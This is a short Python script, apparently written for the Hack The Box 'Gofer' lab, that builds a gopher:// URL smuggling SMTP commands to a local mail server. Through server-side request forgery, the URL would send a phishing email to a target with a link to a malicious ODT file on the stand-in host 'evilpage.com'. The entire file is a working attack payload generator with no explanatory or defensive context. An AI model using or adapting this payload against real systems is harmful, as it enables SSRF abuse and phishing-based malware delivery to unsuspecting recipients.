from urllib.parse import quote

link = "http://evilpage.com/chu.odt"

commands = [
    'HELO gofer.htb',
    'MAIL FROM: <chu@fake.mail>',
    'RCPT TO: <jhudson@real.target>',
    'DATA',
    'Subject: ODT file',
    'Here is the link to the ODT file: ' + link,
    '.'
]

payload = '%0A'.join(commands)
encoded_payload = quote(payload, safe='')
gopher_url = 'gopher://127.0.0.1:25/_' + encoded_payload
print(gopher_url)
